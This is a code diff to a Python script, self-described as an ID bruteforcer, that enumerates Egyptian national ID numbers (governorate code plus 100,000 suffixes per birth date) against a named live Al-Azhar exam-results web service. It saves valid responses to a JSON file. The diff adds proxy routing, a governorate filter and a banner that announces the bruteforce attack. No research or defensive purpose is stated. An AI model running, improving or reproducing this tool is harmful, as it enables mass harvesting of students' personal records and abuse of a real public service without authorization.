@@ -11,6 +11,7 @@ import argparse
 import signal
 import sys
 import os
+from datetime import datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -20,6 +21,7 @@ url = "https://natiga.azhar.eg/WebService1.asmx/GetNatiga2nd"
 
 proxy = {
     "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
 }
 
 headers = {
@@ -60,7 +62,7 @@ def send_post_request(bruted_value, base_value, max_retries=20):
         #     time.sleep(1)
 
         try:
-            response = requests.post(url, headers=headers, data=payload, verify=False, timeout=(5, 15))
+            response = requests.post(url, headers=headers, data=payload, verify=False,proxies=proxy, timeout=(5, 15))
             response.raise_for_status()
             return response
         except requests.exceptions.HTTPError as e:
@@ -105,6 +107,38 @@ def ValidateDateOfBirth(value):
         )
     return ivalue
 
+def ValidateGovId(value):
+    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
+    if value not in all_gov_ids:
+        raise argparse.ArgumentTypeError(
+            f"Gov ID (-g) must be one of: {', '.join(all_gov_ids)}"
+        )
+    return value
+
+def display_startup_info(gov_ids, date_of_birth, threads, output_file, total_requests):
+    print("=" * 60)
+    print("          AZ SCRAPER - AZHAR ID BRUTEFORCER")
+    print("=" * 60)
+    print(f"[*] Target Service: AZHAR Education Portal")
+    print(f"[*] Company/Service URL: https://natiga.azhar.eg/")
+    print(f"[*] API Endpoint: WebService1.asmx/GetNatiga2nd")
+    print(f"[*] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("-" * 60)
+    print("CONFIGURATION:")
+    print(f"[*] Date of Birth (YMMDD): {date_of_birth}")
+    print(f"[*] Gov IDs to scan: {', '.join(gov_ids)}")
+    print(f"[*] Number of Gov IDs: {len(gov_ids)}")
+    print(f"[*] Threads: {threads}")
+    print(f"[*] Output File: {output_file}")
+    print(f"[*] Total Requests to send: {total_requests:,}")
+    print(f"[*] Requests per Gov ID: {total_requests // len(gov_ids):,}")
+    print("-" * 60)
+    print("PROXY CONFIGURATION:")
+    print(f"[*] HTTP Proxy: {proxy.get('http', 'None')}")
+    print(f"[*] HTTPS Proxy: {proxy.get('https', 'None')}")
+    print("=" * 60)
+    print("[+] Starting bruteforce attack...")
+    print("=" * 60)
 
 def signal_handler(signal, frame):
     print("\n[!] Bye")
@@ -113,12 +147,27 @@ def signal_handler(signal, frame):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SCRIPT TO BRUTEFORCE EG-ID IN AZHAR.")
     parser.add_argument('-dob', type=ValidateDateOfBirth, required=True, default='60101', help='date of Birth YMMDD like 20304 (-dob 20304)')
+    parser.add_argument('-g', '--govid', type=ValidateGovId, help='Specific Gov ID to bruteforce (e.g., -g 12). If not specified, all gov IDs will be used.')
     parser.add_argument('-o', '--file', type=str, default='valid_responses.json', help='Output to save results.')
     parser.add_argument('-t', '--threads', type=int, default='50', help='Threads.')
     args = parser.parse_args()
     
     base_value = args.dob
     output_file = args.file
+    
+    # Determine which gov_ids to use
+    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
+    
+    if args.govid:
+        gov_ids = [args.govid]
+    else:
+        gov_ids = all_gov_ids
+    
+    # Calculate total requests
+    total_requests = len(gov_ids) * 100000
+    
+    # Display startup information
+    display_startup_info(gov_ids, base_value, args.threads, output_file, total_requests)
     
     queue = Queue()
     lock = threading.Lock()
@@ -134,8 +183,6 @@ if __name__ == "__main__":
 
     signal.signal(signal.SIGINT, signal_handler)
     
-    gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
-
     for prefix in gov_ids:
         for i in range(100000):
             bruted_value = f'{prefix}{i:05}'
